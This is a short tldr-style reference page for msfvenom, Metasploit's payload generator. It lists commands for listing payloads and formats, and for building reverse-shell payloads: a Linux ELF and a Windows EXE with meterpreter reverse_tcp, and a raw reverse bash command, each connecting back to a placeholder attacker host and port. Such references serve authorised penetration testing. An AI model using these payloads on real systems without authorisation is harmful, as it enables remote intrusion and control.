---
author: ['Fazle Arefin', 'Jonathan']
date: 1653890310
title: "msfvenom"
description: "msfvenom, Manually generate payloads for metasploit."
categories: "common"
---
> More information: <https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom>.

- List payloads:

```bash
msfvenom -l payloads
```

- List formats:

```bash
msfvenom -l formats
```

- Show payload options:

```bash
msfvenom -p payload --list-options
```

- Create an ELF binary with a reverse TCP handler:

```bash
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=local_ip LPORT=local_port -f elf -o path/to/binary
```

- Create an EXE binary with a reverse TCP handler:

```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=local_ip LPORT=local_port -f exe -o path/to/binary.exe
```

- Create a raw bash with a reverse TCP handler:

```bash
msfvenom -p cmd/unix/reverse_bash LHOST=local_ip LPORT=local_port -f raw
```
List of changes to this documentation


Author | Description | ISO 8601 Date | GitHub link
------|-----|-----|-----
[Fazle Arefin](mailto:fazlearefin@users.noreply.github.com) | msfvenom: add raw example (#8095) * Use built in output option in msfvenom * Add msfvenom example to generate bash reverse tcp handler [...] | 2022-05-30T07:58:30 | [cf7215e832ab](https://github.com/tldr-pages/tldr/commit/cf7215e832aba55f8ace42e5418b5c8bf94c14af)
[Jonathan](mailto:1909202+Jab2870@users.noreply.github.com) | msfvenom: add page (#3476) | 2019-12-29T04:06:13 | [37ffdcb0a799](https://github.com/tldr-pages/tldr/commit/37ffdcb0a799a3f9b47e2bb73d5f0208caedeefe)

